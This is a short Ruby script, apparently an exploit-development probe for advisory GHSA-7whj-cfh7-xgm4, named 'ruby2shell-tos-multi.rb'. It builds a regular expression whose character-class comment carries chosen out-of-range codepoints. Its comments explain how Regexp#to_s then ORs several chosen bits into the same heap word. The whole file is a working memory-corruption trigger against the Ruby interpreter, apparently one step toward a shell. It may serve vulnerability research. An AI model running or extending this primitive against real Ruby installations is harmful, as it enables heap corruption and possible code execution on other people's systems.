#!/usr/bin/env ruby
# GHSA-7whj-cfh7-xgm4 depth probe: several out-of-range codepoints in one
# character-class comment. Each reaches next_state_val during Regexp#to_s and
# one-bit-ORs the word at cc+8+4*(code/32); several codes with the same
# quotient therefore OR several bits into the SAME heap word.
#
# Usage: ruby ruby2shell-tos-multi.rb HEX_CODE[,HEX_CODE...]
codes = (ARGV[0] || ENV.fetch('TOS_CODES')).split(',').map { |h| Integer(h, 16) }
inner = codes.map { |c| "\\x{#{format('%X', c)}}" }.join
src = "(?:[](?#" + inner + ")])"
begin
  re = Regexp.new(src)
rescue RegexpError => e
  puts "REGEXPERROR #{e.message.lines.first.strip}"
  exit 0
end
puts re.to_s.inspect
